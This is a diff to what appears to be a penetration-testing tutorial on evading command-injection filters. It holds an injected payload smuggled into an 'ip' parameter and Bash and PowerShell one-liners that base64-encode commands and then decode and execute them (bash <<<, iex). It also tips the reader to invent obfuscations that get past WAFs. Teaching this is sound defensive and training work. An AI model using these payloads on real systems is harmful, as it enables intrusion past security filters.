@@ -62,20 +62,19 @@ ip=127.0.0.1%0d%0abash<<<$(base64%09-d<<<d2hvYW1pCg==)
 ```
 >   Tip: Note that we are using `<<<` to avoid using a pipe `|`, which is a filtered character. 
 
-Additionally, we can first convert the string from `utf-8` to `utf-16` before it is encoded into base64. Command is as follows:
+Additionally, we can first convert the string from `utf-8` to `utf-16` before it is encoded into base64 by using the following command:
 ```nix
-echo -n whoami 
+echo -n whoami | iconv -f utf-8 -t utf-16le | base64
 ```
 
-We use the same technique with Windows as well. First, we need to base64 encode our string, as follows:
+This encoding technique can also be used in Windows environment by using the following command:
 ```powershell
 [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
 ```
 
+We can then decode the base64-encoded string and execute it with a Powershell sub-shell (`iex "$()"`):
+```powershell
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+```
 
-
-
-
-
-
-> Tip: Try to create your own unique obfuscation techniques by getting creative with Bash or Powershell. This way, it is much less likely to be denied by a filter or a WAF.
+Finally, it is a good idea to be creative with Bash and Powershell to create your own unique obfuscation methods. This way, it is much less likely for the payload to be denied by a filter or a WAF.
